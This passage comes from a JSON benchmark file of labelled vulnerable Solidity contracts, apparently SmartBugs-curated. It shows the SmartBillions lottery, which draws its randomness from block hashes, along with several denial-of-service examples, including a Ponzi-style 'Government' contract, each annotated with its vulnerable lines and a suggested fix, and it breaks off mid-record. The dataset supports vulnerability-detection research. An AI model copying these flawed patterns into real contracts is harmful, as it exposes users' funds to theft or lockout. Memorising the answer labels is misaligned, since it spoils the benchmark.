hashes database\n    uint public hashLast = 0; // last saved block of hashes\n    uint public hashNext = 0; // next available bet block.number\n    uint public hashBetSum = 0; // used bet volume of next block\n    uint public hashBetMax = 5 ether; // maximum bet size per block\n    uint[] public hashes; // space for storing lottery results\n\n    // constants\n    //uint public constant hashesSize = 1024 ; // DEBUG ONLY !!!\n    uint public constant hashesSize = 16384 ; // 30 days of blocks\n    uint public coldStoreLast = 0 ; // block of last cold store transfer\n\n    // events\n    event LogBet(address indexed player, uint bethash, uint blocknumber, uint betsize);\n    event LogLoss(address indexed player, uint bethash, uint hash);\n    event LogWin(address indexed player, uint bethash, uint hash, uint prize);\n    event LogInvestment(address indexed investor, address indexed partner, uint amount);\n    event LogRecordWin(address indexed player, uint amount);\n    event LogLate(address indexed player,uint playerBlockNumber,uint currentBlockNumber);\n    event LogDividend(address indexed investor, uint amount, uint period);\n\n    modifier onlyOwner() {\n        assert(msg.sender == owner);\n        _;\n    }\n\n    modifier onlyAnimator() {\n        assert(msg.sender == animator);\n        _;\n    }\n\n    // constructor\n    function SmartBillions() {\n        owner = msg.sender;\n        animator = msg.sender;\n        wallets[owner].lastDividendPeriod = uint16(dividendPeriod);\n        dividends.push(0); // not used\n        dividends.push(0); // current dividend\n    }\n\n/* getters */\n\n    /**\n     * @dev Show length of allocated swap space\n     */\n    function hashesLength() constant external returns (uint) {\n        return uint(hashes.length);\n    }\n\n    /**\n     * @dev Show balance of wallet\n     * @param _owner The address of the account.\n     */\n    function walletBalanceOf(address _owner) constant external returns (uint) {\n        return uint(wallets[_owner].balance);\n    }\n\n    /**\n     * @dev Show last dividend period processed\n     * @param _owner The address of the account.\n     */\n    function walletPeriodOf(address _owner) constant external returns (uint) {\n        return uint(wallets[_owner].lastDividendPeriod);\n    }\n\n    /**\n     * @dev Show block number when withdraw can continue\n     * @param _owner The address of the account.\n     */\n    function walletBlockOf(address _owner) constant external returns (uint) {\n        return uint(wallets[_owner].nextWithdrawBlock);\n    }\n\n    /**\n     * @dev Show bet size.\n     * @param _owner The address of the player.\n     */\n    function betValueOf(address _owner) constant external returns (uint) {\n        return uint(bets[_owner].value);\n    }\n\n    /**\n     * @dev Show block number of lottery run for the bet.\n     * @param _owner The address of the player.\n     */\n    function betHashOf(address _owner) constant external returns (uint) {\n        return uint(bets[_owner].betHash);\n    }\n\n    /**\n     * @dev Show block number of lottery run for the bet.\n     * @param _owner The address of the player.\n     */\n    function betBlockNumberOf(address _owner) constant external returns (uint) {\n        return uint(bets[_owner].blockNum);\n    }\n\n    /**\n     * @dev Print number of block till next expected dividend payment\n     */\n    function dividendsBlocks() constant external returns (uint) {\n        if(investStart > 0) {\n            return(0);\n        }\n        uint period = (block.number - hashFirst) / (10 * hashesSize);\n        if(period > dividendPeriod) {\n            return(0);\n        }\n        return((10 * hashesSize) - ((block.number - hashFirst) % (10 * hashesSize)));\n    }\n\n/* administrative functions */\n\n    /**\n     * @dev Change owner.\n     * @param _who The address of new owner.\n     */\n    function changeOwner(address _who) external onlyOwner {\n        assert(_who != address(0));\n        commitDividend(msg.sender);\n        commitDividend(_who);\n        owner = _who;\n    }\n\n    /**\n     * @dev Change animator.\n     * @param _who The address of new animator.\n     */\n    function changeAnimator(address _who) external onlyAnimator {\n        assert(_who != address(0));\n        commitDividend(msg.sender);\n        commitDividend(_who);\n        animator = _who;\n    }\n\n    /**\n     * @dev Set ICO Start block.\n     * @param _when The block number of the ICO.\n     */\n    function setInvestStart(uint _when) external onlyOwner {\n        require(investStart == 1 && hashFirst > 0 && block.number < _when);\n        investStart = _when;\n    }\n\n    /**\n     * @dev Set maximum bet size per block\n     * @param _maxsum The maximum bet size in wei.\n     */\n    function setBetMax(uint _maxsum) external onlyOwner {\n        hashBetMax = _maxsum;\n    }\n\n    /**\n     * @dev Reset bet size accounting, to increase bet volume above safe limits\n     */\n    function resetBet() external onlyOwner {\n        hashNext = block.number + 3;\n        hashBetSum = 0;\n    }\n\n    /**\n     * @dev Move funds to cold storage\n     * @dev investBalance and walletBalance is protected from withdraw by owner\n     * @dev if funding is > 50% admin can withdraw only 0.25% of balance weakly\n     * @param _amount The amount of wei to move to cold storage\n     */\n    function coldStore(uint _amount) external onlyOwner {\n        houseKeeping();\n        require(_amount > 0 && this.balance >= (investBalance * 9 / 10) + walletBalance + _amount);\n        if(investBalance >= investBalanceMax / 2){ // additional jackpot protection\n            require((_amount <= this.balance / 400) && coldStoreLast + 4 * 60 * 24 * 7 <= block.number);\n        }\n        msg.sender.transfer(_amount);\n        coldStoreLast = block.number;\n    }\n\n    /**\n     * @dev Move funds to contract jackpot\n     */\n    function hotStore() payable external {\n        houseKeeping();\n    }\n\n/* housekeeping functions */\n\n    /**\n     * @dev Update accounting\n     */\n    function houseKeeping() public {\n        if(investStart > 1 && block.number >= investStart + (hashesSize * 5)){ // ca. 14 days\n            investStart = 0; // start dividend payments\n        }\n        else {\n            if(hashFirst > 0){\n\t\t        uint period = (block.number - hashFirst) / (10 * hashesSize );\n                if(period > dividends.length - 2) {\n                    dividends.push(0);\n                }\n                if(period > dividendPeriod && investStart == 0 && dividendPeriod < dividends.length - 1) {\n                    dividendPeriod++;\n                }\n            }\n        }\n    }\n\n/* payments */\n\n    /**\n     * @dev Pay balance from wallet\n     */\n    function payWallet() public {\n        if(wallets[msg.sender].balance > 0 && wallets[msg.sender].nextWithdrawBlock <= block.number){\n            uint balance = wallets[msg.sender].balance;\n            wallets[msg.sender].balance = 0;\n            walletBalance -= balance;\n            pay(balance);\n        }\n    }\n\n    function pay(uint _amount) private {\n        uint maxpay = this.balance / 2;\n        if(maxpay >= _amount) {\n            msg.sender.transfer(_amount);\n            if(_amount > 1 finney) {\n                houseKeeping();\n            }\n        }\n        else {\n            uint keepbalance = _amount - maxpay;\n            walletBalance += keepbalance;\n            wallets[msg.sender].balance += uint208(keepbalance);\n            wallets[msg.sender].nextWithdrawBlock = uint32(block.number + 4 * 60 * 24 * 30); // wait 1 month for more funds\n            msg.sender.transfer(maxpay);\n        }\n    }\n\n/* investment functions */\n\n    /**\n     * @dev Buy tokens\n     */\n    function investDirect() payable external {\n        invest(owner);\n    }\n\n    /**\n     * @dev Buy tokens with affiliate partner\n     * @param _partner Affiliate partner\n     */\n    function invest(address _partner) payable public {\n        //require(fromUSA()==false); // fromUSA() not yet implemented :-(\n        require(investStart > 1 && block.number < investStart + (hashesSize * 5) && investBalance < investBalanceMax);\n        uint investing = msg.value;\n        if(investing > investBalanceMax - investBalance) {\n            investing = investBalanceMax - investBalance;\n            investBalance = investBalanceMax;\n            investStart = 0; // close investment round\n            msg.sender.transfer(msg.value.sub(investing)); // send back funds immediately\n        }\n        else{\n            investBalance += investing;\n        }\n        if(_partner == address(0) || _partner == owner){\n            walletBalance += investing / 10;\n            wallets[owner].balance += uint208(investing / 10);} // 10% for marketing if no affiliates\n        else{\n            walletBalance += (investing * 5 / 100) * 2;\n            wallets[owner].balance += uint208(investing * 5 / 100); // 5% initial marketing funds\n            wallets[_partner].balance += uint208(investing * 5 / 100);} // 5% for affiliates\n        wallets[msg.sender].lastDividendPeriod = uint16(dividendPeriod); // assert(dividendPeriod == 1);\n        uint senderBalance = investing / 10**15;\n        uint ownerBalance = investing * 16 / 10**17  ;\n        uint animatorBalance = investing * 10 / 10**17  ;\n        balances[msg.sender] += senderBalance;\n        balances[owner] += ownerBalance ; // 13% of shares go to developers\n        balances[animator] += animatorBalance ; // 8% of shares go to animator\n        totalSupply += senderBalance + ownerBalance + animatorBalance;\n        Transfer(address(0),msg.sender,senderBalance); // for etherscan\n        Transfer(address(0),owner,ownerBalance); // for etherscan\n        Transfer(address(0),animator,animatorBalance); // for etherscan\n        LogInvestment(msg.sender,_partner,investing);\n    }\n\n    /**\n     * @dev Delete all tokens owned by sender and return unpaid dividends and 90% of initial investment\n     */\n    function disinvest() external {\n        require(investStart == 0);\n        commitDividend(msg.sender);\n        uint initialInvestment = balances[msg.sender] * 10**15;\n        Transfer(msg.sender,address(0),balances[msg.sender]); // for etherscan\n        delete balances[msg.sender]; // totalSupply stays the same, investBalance is reduced\n        investBalance -= initialInvestment;\n        wallets[msg.sender].balance += uint208(initialInvestment * 9 / 10);\n        payWallet();\n    }\n\n    /**\n     * @dev Pay unpaid dividends\n     */\n    function payDividends() external {\n        require(investStart == 0);\n        commitDividend(msg.sender);\n        payWallet();\n    }\n\n    /**\n     * @dev Commit remaining dividends before transfer of tokens\n     */\n    function commitDividend(address _who) internal {\n        uint last = wallets[_who].lastDividendPeriod;\n        if((balances[_who]==0) || (last==0)){\n            wallets[_who].lastDividendPeriod=uint16(dividendPeriod);\n            return;\n        }\n        if(last==dividendPeriod) {\n            return;\n        }\n        uint share = balances[_who] * 0xffffffff / totalSupply;\n        uint balance = 0;\n        for(;last<dividendPeriod;last++) {\n            balance += share * dividends[last];\n        }\n        balance = (balance / 0xffffffff);\n        walletBalance += balance;\n        wallets[_who].balance += uint208(balance);\n        wallets[_who].lastDividendPeriod = uint16(last);\n        LogDividend(_who,balance,last);\n    }\n\n/* lottery functions */\n\n    function betPrize(Bet _player, uint24 _hash) constant private returns (uint) { // house fee 13.85%\n        uint24 bethash = uint24(_player.betHash);\n        uint24 hit = bethash ^ _hash;\n        uint24 matches =\n            ((hit & 0xF) == 0 ? 1 : 0 ) +\n            ((hit & 0xF0) == 0 ? 1 : 0 ) +\n            ((hit & 0xF00) == 0 ? 1 : 0 ) +\n            ((hit & 0xF000) == 0 ? 1 : 0 ) +\n            ((hit & 0xF0000) == 0 ? 1 : 0 ) +\n            ((hit & 0xF00000) == 0 ? 1 : 0 );\n        if(matches == 6){\n            return(uint(_player.value) * 7000000);\n        }\n        if(matches == 5){\n            return(uint(_player.value) * 20000);\n        }\n        if(matches == 4){\n            return(uint(_player.value) * 500);\n        }\n        if(matches == 3){\n            return(uint(_player.value) * 25);\n        }\n        if(matches == 2){\n            return(uint(_player.value) * 3);\n        }\n        return(0);\n    }\n\n    /**\n     * @dev Check if won in lottery\n     */\n    function betOf(address _who) constant external returns (uint)  {\n        Bet memory player = bets[_who];\n        if( (player.value==0) ||\n            (player.blockNum<=1) ||\n            (block.number<player.blockNum) ||\n            (block.number>=player.blockNum + (10 * hashesSize))){\n            return(0);\n        }\n        if(block.number<player.blockNum+256){\n            // <yes> <report> BAD_RANDOMNESS\n            return(betPrize(player,uint24(block.blockhash(player.blockNum))));\n        }\n        if(hashFirst>0){\n            uint32 hash = getHash(player.blockNum);\n            if(hash == 0x1000000) { // load hash failed :-(, return funds\n                return(uint(player.value));\n            }\n            else{\n                return(betPrize(player,uint24(hash)));\n            }\n\t}\n        return(0);\n    }\n\n    /**\n     * @dev Check if won in lottery\n     */\n    function won() public {\n        Bet memory player = bets[msg.sender];\n        if(player.blockNum==0){ // create a new player\n            bets[msg.sender] = Bet({value: 0, betHash: 0, blockNum: 1});\n            return;\n        }\n        if((player.value==0) || (player.blockNum==1)){\n            payWallet();\n            return;\n        }\n        require(block.number>player.blockNum); // if there is an active bet, throw()\n        if(player.blockNum + (10 * hashesSize) <= block.number){ // last bet too long ago, lost !\n            LogLate(msg.sender,player.blockNum,block.number);\n            bets[msg.sender] = Bet({value: 0, betHash: 0, blockNum: 1});\n            return;\n        }\n        uint prize = 0;\n        uint32 hash = 0;\n        if(block.number<player.blockNum+256){\n            // <yes> <report> BAD_RANDOMNESS\n            hash = uint24(block.blockhash(player.blockNum));\n            prize = betPrize(player,uint24(hash));\n        }\n        else {\n            if(hashFirst>0){ // lottery is open even before swap space (hashes) is ready, but player must collect results within 256 blocks after run\n                hash = getHash(player.blockNum);\n                if(hash == 0x1000000) { // load hash failed :-(, return funds\n                    prize = uint(player.value);\n                }\n                else{\n                    prize = betPrize(player,uint24(hash));\n                }\n\t    }\n            else{\n                LogLate(msg.sender,player.blockNum,block.number);\n                bets[msg.sender] = Bet({value: 0, betHash: 0, blockNum: 1});\n                return();\n            }\n        }\n        bets[msg.sender] = Bet({value: 0, betHash: 0, blockNum: 1});\n        if(prize>0) {\n            LogWin(msg.sender,uint(player.betHash),uint(hash),prize);\n            if(prize > maxWin){\n                maxWin = prize;\n                LogRecordWin(msg.sender,prize);\n            }\n            pay(prize);\n        }\n        else{\n            LogLoss(msg.sender,uint(player.betHash),uint(hash));\n        }\n    }\n\n    /**\n     * @dev Send ether to buy tokens during ICO\n     * @dev or send less than 1 ether to contract to play\n     * @dev or send 0 to collect prize\n     */\n    function () payable external {\n        if(msg.value > 0){\n            if(investStart>1){ // during ICO payment to the contract is treated as investment\n                invest(owner);\n            }\n            else{ // if not ICO running payment to contract is treated as play\n                play();\n            }\n            return;\n        }\n        //check for dividends and other assets\n        if(investStart == 0 && balances[msg.sender]>0){\n            commitDividend(msg.sender);}\n        won(); // will run payWallet() if nothing else available\n    }\n\n    /**\n     * @dev Play in lottery\n     */\n    function play() payable public returns (uint) {\n        return playSystem(uint(sha3(msg.sender,block.number)), address(0));\n    }\n\n    /**\n     * @dev Play in lottery with random numbers\n     * @param _partner Affiliate partner\n     */\n    function playRandom(address _partner) payable public returns (uint) {\n        return playSystem(uint(sha3(msg.sender,block.number)), _partner);\n    }\n\n    /**\n     * @dev Play in lottery with own numbers\n     * @param _partner Affiliate partner\n     */\n    function playSystem(uint _hash, address _partner) payable public returns (uint) {\n        won(); // check if player did not win\n        uint24 bethash = uint24(_hash);\n        require(msg.value <= 1 ether && msg.value < hashBetMax);\n        if(msg.value > 0){\n            if(investStart==0) { // dividends only after investment finished\n                dividends[dividendPeriod] += msg.value / 20; // 5% dividend\n            }\n            if(_partner != address(0)) {\n                uint fee = msg.value / 100;\n                walletBalance += fee;\n                wallets[_partner].balance += uint208(fee); // 1% for affiliates\n            }\n            if(hashNext < block.number + 3) {\n                hashNext = block.number + 3;\n                hashBetSum = msg.value;\n            }\n            else{\n                if(hashBetSum > hashBetMax) {\n                    hashNext++;\n                    hashBetSum = msg.value;\n                }\n                else{\n                    hashBetSum += msg.value;\n                }\n            }\n            bets[msg.sender] = Bet({value: uint192(msg.value), betHash: uint32(bethash), blockNum: uint32(hashNext)});\n            LogBet(msg.sender,uint(bethash),hashNext,msg.value);\n        }\n        putHash(); // players help collecing data\n        return(hashNext);\n    }\n\n/* database functions */\n\n    /**\n     * @dev Create hash data swap space\n     * @param _sadd Number of hashes to add (<=256)\n     */\n    function addHashes(uint _sadd) public returns (uint) {\n        require(hashFirst == 0 && _sadd > 0 && _sadd <= hashesSize);\n        uint n = hashes.length;\n        if(n + _sadd > hashesSize){\n            hashes.length = hashesSize;\n        }\n        else{\n            hashes.length += _sadd;\n        }\n        for(;n<hashes.length;n++){ // make sure to burn gas\n            hashes[n] = 1;\n        }\n        if(hashes.length>=hashesSize) { // assume block.number > 10\n            hashFirst = block.number - ( block.number % 10);\n            hashLast = hashFirst;\n        }\n        return(hashes.length);\n    }\n\n    /**\n     * @dev Create hash data swap space, add 128 hashes\n     */\n    function addHashes128() external returns (uint) {\n        return(addHashes(128));\n    }\n\n    function calcHashes(uint32 _lastb, uint32 _delta) constant private returns (uint) {\n        // <yes> <report> BAD_RANDOMNESS\n        return( ( uint(block.blockhash(_lastb  )) & 0xFFFFFF )\n        // <yes> <report> BAD_RANDOMNESS\n            | ( ( uint(block.blockhash(_lastb+1)) & 0xFFFFFF ) << 24 )\n            // <yes> <report> BAD_RANDOMNESS\n            | ( ( uint(block.blockhash(_lastb+2)) & 0xFFFFFF ) << 48 )\n            // <yes> <report> BAD_RANDOMNESS\n            | ( ( uint(block.blockhash(_lastb+3)) & 0xFFFFFF ) << 72 )\n            // <yes> <report> BAD_RANDOMNESS\n            | ( ( uint(block.blockhash(_lastb+4)) & 0xFFFFFF ) << 96 )\n            // <yes> <report> BAD_RANDOMNESS\n            | ( ( uint(block.blockhash(_lastb+5)) & 0xFFFFFF ) << 120 )\n            // <yes> <report> BAD_RANDOMNESS\n            | ( ( uint(block.blockhash(_lastb+6)) & 0xFFFFFF ) << 144 )\n            // <yes> <report> BAD_RANDOMNESS\n            | ( ( uint(block.blockhash(_lastb+7)) & 0xFFFFFF ) << 168 )\n            // <yes> <report> BAD_RANDOMNESS\n            | ( ( uint(block.blockhash(_lastb+8)) & 0xFFFFFF ) << 192 )\n            // <yes> <report> BAD_RANDOMNESS\n            | ( ( uint(block.blockhash(_lastb+9)) & 0xFFFFFF ) << 216 )\n            | ( ( uint(_delta) / hashesSize) << 240));\n    }\n\n    function getHash(uint _block) constant private returns (uint32) {\n        uint delta = (_block - hashFirst) / 10;\n        uint hash = hashes[delta % hashesSize];\n        if(delta / hashesSize != hash >> 240) {\n            return(0x1000000); // load failed, incorrect data in hashes\n        }\n        uint slotp = (_block - hashFirst) % 10;\n        return(uint32((hash >> (24 * slotp)) & 0xFFFFFF));\n    }\n\n    /**\n     * @dev Fill hash data\n     */\n    function putHash() public returns (bool) {\n        uint lastb = hashLast;\n        if(lastb == 0 || block.number <= lastb + 10) {\n            return(false);\n        }\n        uint blockn256;\n        if(block.number<256) { // useless test for testnet :-(\n            blockn256 = 0;\n        }\n        else{\n            blockn256 = block.number - 256;\n        }\n        if(lastb < blockn256) {\n            uint num = blockn256;\n            num += num % 10;\n            lastb = num;\n        }\n        uint delta = (lastb - hashFirst) / 10;\n        hashes[delta % hashesSize] = calcHashes(uint32(lastb),uint32(delta));\n        hashLast = lastb + 10;\n        return(true);\n    }\n\n    /**\n     * @dev Fill hash data many times\n     * @param _num Number of iterations\n     */\n    function putHashes(uint _num) external {\n        uint n=0;\n        for(;n<_num;n++){\n            if(!putHash()){\n                return;\n            }\n        }\n    }\n\n}\n",
    "vulnerable_function": "betOf",
    "vulnerable_lines": [
      523
    ],
    "vulnerability_type": "weak_randomness",
    "original_category": "bad_randomness",
    "severity": "medium",
    "difficulty_tier": 4,
    "description": "Weak randomness - predictable random number generation at line(s) 523",
    "fix_description": "Use Chainlink VRF or commit-reveal scheme for randomness",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/bad_randomness/smart_billions.sol",
    "pragma": "0.4.13",
    "source_url": "https://etherscan.io/address/0x5ace17f87c7391e5792a7683069a8025b83bbd85#code"
  },
  {
    "id": "smartbugs_denial_of_service_auction",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "auction.sol",
    "file_content": "/*\n * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/denial_of_service/auction.sol\n * @author: -\n * @vulnerable_at_lines: 23\n */\n\npragma solidity ^0.4.15;\n\n//Auction susceptible to DoS attack\ncontract DosAuction {\n  address currentFrontrunner;\n  uint currentBid;\n\n  //Takes in bid, refunding the frontrunner if they are outbid\n  function bid() payable {\n    require(msg.value > currentBid);\n\n    //If the refund fails, the entire transaction reverts.\n    //Therefore a frontrunner who always fails will win\n    if (currentFrontrunner != 0) {\n      //E.g. if recipients fallback function is just revert()\n      // <yes> <report> DENIAL_OF_SERVICE\n      require(currentFrontrunner.send(currentBid));\n    }\n\n    currentFrontrunner = msg.sender;\n    currentBid         = msg.value;\n  }\n}\n",
    "vulnerable_function": "is",
    "vulnerable_lines": [
      23
    ],
    "vulnerability_type": "dos",
    "original_category": "denial_of_service",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Denial of service vulnerability - resource exhaustion or revert conditions at line(s) 23",
    "fix_description": "Avoid unbounded loops, implement pull payment pattern, add gas limits",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/denial_of_service/auction.sol",
    "pragma": "0.4.15",
    "source_url": "https://github.com/trailofbits/not-so-smart-contracts/blob/master/denial_of_service/auction.sol"
  },
  {
    "id": "smartbugs_denial_of_service_dos_address",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "dos_address.sol",
    "file_content": "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/dos_gas_limit/dos_address.sol\n * @author: -\n * @vulnerable_at_lines: 16,17,18\n */\n\npragma solidity ^0.4.25;\n\ncontract DosGas {\n\n    address[] creditorAddresses;\n    bool win = false;\n\n    function emptyCreditors() public {\n        // <yes> <report> DENIAL_OF_SERVICE\n        if(creditorAddresses.length>1500) {\n            creditorAddresses = new address[](0);\n            win = true;\n        }\n    }\n\n    function addCreditors() public returns (bool) {\n        for(uint i=0;i<350;i++) {\n          creditorAddresses.push(msg.sender);\n        }\n        return true;\n    }\n\n    function iWin() public view returns (bool) {\n        return win;\n    }\n\n    function numberCreditors() public view returns (uint) {\n        return creditorAddresses.length;\n    }\n}\n",
    "vulnerable_function": "emptyCreditors",
    "vulnerable_lines": [
      16,
      17,
      18
    ],
    "vulnerability_type": "dos",
    "original_category": "denial_of_service",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Denial of service vulnerability - resource exhaustion or revert conditions at line(s) 16, 17, 18",
    "fix_description": "Avoid unbounded loops, implement pull payment pattern, add gas limits",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/denial_of_service/dos_address.sol",
    "pragma": "0.4.25",
    "source_url": "https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/dos_gas_limit/dos_address.sol"
  },
  {
    "id": "smartbugs_denial_of_service_dos_number",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "dos_number.sol",
    "file_content": "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/dos_gas_limit/dos_number.sol\n * @author: -\n * @vulnerable_at_lines: 18,19,20,21,22\n */\n\npragma solidity ^0.4.25;\n\ncontract DosNumber {\n\n    uint numElements = 0;\n    uint[] array;\n\n    function insertNnumbers(uint value,uint numbers) public {\n\n        // Gas DOS if number > 382 more or less, it depends on actual gas limit\n        // <yes> <report> DENIAL_OF_SERVICE\n        for(uint i=0;i<numbers;i++) {\n            if(numElements == array.length) {\n                array.length += 1;\n            }\n            array[numElements++] = value;\n        }\n    }\n\n    function clear() public {\n        require(numElements>1500);\n        numElements = 0;\n    }\n\n    // Gas DOS clear\n    function clearDOS() public {\n\n        // number depends on actual gas limit\n        require(numElements>1500);\n        array = new uint[](0);\n        numElements = 0;\n    }\n\n    function getLengthArray() public view returns(uint) {\n        return numElements;\n    }\n\n    function getRealLengthArray() public view returns(uint) {\n        return array.length;\n    }\n}\n",
    "vulnerable_function": "insertNnumbers",
    "vulnerable_lines": [
      18,
      19,
      20,
      21,
      22
    ],
    "vulnerability_type": "dos",
    "original_category": "denial_of_service",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Denial of service vulnerability - resource exhaustion or revert conditions at line(s) 18, 19, 20, 21, 22",
    "fix_description": "Avoid unbounded loops, implement pull payment pattern, add gas limits",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/denial_of_service/dos_number.sol",
    "pragma": "0.4.25",
    "source_url": "https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/dos_gas_limit/dos_number.sol"
  },
  {
    "id": "smartbugs_denial_of_service_dos_simple",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "dos_simple.sol",
    "file_content": "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/dos_gas_limit/dos_simple.sol\n * @author: -\n * @vulnerable_at_lines: 17,18\n */\n\n\npragma solidity ^0.4.25;\n\ncontract DosOneFunc {\n\n    address[] listAddresses;\n\n    function ifillArray() public returns (bool){\n        if(listAddresses.length<1500) {\n            // <yes> <report> DENIAL_OF_SERVICE\n            for(uint i=0;i<350;i++) {\n                listAddresses.push(msg.sender);\n            }\n            return true;\n\n        } else {\n            listAddresses = new address[](0);\n            return false;\n        }\n    }\n}\n",
    "vulnerable_function": "ifillArray",
    "vulnerable_lines": [
      17,
      18
    ],
    "vulnerability_type": "dos",
    "original_category": "denial_of_service",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Denial of service vulnerability - resource exhaustion or revert conditions at line(s) 17, 18",
    "fix_description": "Avoid unbounded loops, implement pull payment pattern, add gas limits",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/denial_of_service/dos_simple.sol",
    "pragma": "0.4.25",
    "source_url": "https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/dos_gas_limit/dos_simple.sol"
  },
  {
    "id": "smartbugs_denial_of_service_list_dos",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "list_dos.sol",
    "file_content": "/*\n * @source: https://etherscan.io/address/0xf45717552f12ef7cb65e95476f217ea008167ae3#code\n * @author: -\n * @vulnerable_at_lines: 46,48\n */\n\n//added pragma version\npragma solidity ^0.4.0;\n\ncontract Government {\n\n     // Global Variables\n     uint32 public lastCreditorPayedOut;\n     uint public lastTimeOfNewCredit;\n     uint public profitFromCrash;\n     address[] public creditorAddresses;\n     uint[] public creditorAmounts;\n     address public corruptElite;\n     mapping (address => uint) buddies;\n     uint constant TWELVE_HOURS = 43200;\n     uint8 public round;\n\n     function Government() {\n         // The corrupt elite establishes a new government\n         // this is the commitment of the corrupt Elite - everything that can not be saved from a crash\n         profitFromCrash = msg.value;\n         corruptElite = msg.sender;\n         lastTimeOfNewCredit = block.timestamp;\n     }\n\n     function lendGovernmentMoney(address buddy) returns (bool) {\n         uint amount = msg.value;\n         // check if the system already broke down. If for 12h no new creditor gives new credit to the system it will brake down.\n         // 12h are on average = 60*60*12/12.5 = 3456\n         if (lastTimeOfNewCredit + TWELVE_HOURS < block.timestamp) {\n             // Return money to sender\n             msg.sender.send(amount);\n             // Sends all contract money to the last creditor\n             creditorAddresses[creditorAddresses.length - 1].send(profitFromCrash);\n             corruptElite.send(this.balance);\n             // Reset contract state\n             lastCreditorPayedOut = 0;\n             lastTimeOfNewCredit = block.timestamp;\n             profitFromCrash = 0;\n            // <yes> <report> DENIAL_OF_SERVICE\n             creditorAddresses = new address[](0);\n            // <yes> <report> DENIAL_OF_SERVICE\n             creditorAmounts = new uint[](0);\n             round += 1;\n             return false;\n         }\n         else {\n             // the system needs to collect at least 1% of the profit from a crash to stay alive\n             if (amount >= 10 ** 18) {\n                 // the System has received fresh money, it will survive at leat 12h more\n                 lastTimeOfNewCredit = block.timestamp;\n                 // register the new creditor and his amount with 10% interest rate\n                 creditorAddresses.push(msg.sender);\n                 creditorAmounts.push(amount * 110 / 100);\n                 // now the money is distributed\n                 // first the corrupt elite grabs 5% - thieves!\n                 corruptElite.send(amount * 5/100);\n                 // 5% are going into the economy (they will increase the value for the person seeing the crash comming)\n                 if (profitFromCrash < 10000 * 10**18) {\n                     profitFromCrash += amount * 5/100;\n                 }\n                 // if you have a buddy in the government (and he is in the creditor list) he can get 5% of your credits.\n                 // Make a deal with him.\n                 if(buddies[buddy] >= amount) {\n                     buddy.send(amount * 5/100);\n                 }\n                 buddies[msg.sender] += amount * 110 / 100;\n                 // 90% of the money will be used to pay out old creditors\n                 if (creditorAmounts[lastCreditorPayedOut] <= address(this).balance - profitFromCrash) {\n                     creditorAddresses[lastCreditorPayedOut].send(creditorAmounts[lastCreditorPayedOut]);\n                     buddies[creditorAddresses[lastCreditorPayedOut]] -= creditorAmounts[lastCreditorPayedOut];\n                     lastCreditorPayedOut += 1;\n                 }\n                 return true;\n             }\n             else {\n                 msg.sender.send(amount);\n                 return false;\n             }\n         }\n     }\n\n     // fallback function\n     function() {\n         lendGovernmentMoney(0);\n     }\n\n     function totalDebt() returns (uint debt) {\n         for(uint i=lastCreditorPayedOut; i<creditorAmounts.length; i++){\n             debt += creditorAmounts[i];\n         }\n     }\n\n     function totalPayedOut() returns (uint payout) {\n         for(uint i=0; i<lastCreditorPayedOut; i++){\n             payout += creditorAmounts[i];\n         }\n     }\n\n     // better don't do it (unless you are the corrupt elite and you want to establish trust in the system)\n     function investInTheSystem() {\n         profitFromCrash += msg.value;\n     }\n\n     // From time to time the corrupt elite inherits it's power to the next generation\n     function inheritToNextGeneration(address nextGeneration) {\n         if (msg.sender == corruptElite) {\n             corruptElite = nextGeneration;\n         }\n     }\n\n     function getCreditorAddresses() returns (address[]) {\n         return creditorAddresses;\n     }\n\n     function getCreditorAmounts() returns (uint[]) {\n         return creditorAmounts;\n     }\n }\n",
    "vulnerable_function": "lendGovernmentMoney",
    "vulnerable_lines": [
      46
    ],
    "vulnerability_type": "dos",
    "original_category": "denial_of_service",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Denial of service vulnerability - resource exhaustion or revert conditions at line(s) 46",
    "fix_description": "Avoid unbounded loops, implement pull payment pattern, add gas limits",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/denial_of_service/list_dos.sol",
    "pragma": "0.4.0",
    "source_url": "https://etherscan.io/address/0xf45717552f12ef7cb65e95476f217ea008167ae3#code"
  },
  {
    "id": "smartbugs_denial_of_service_send_loop",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "send_loop.sol",
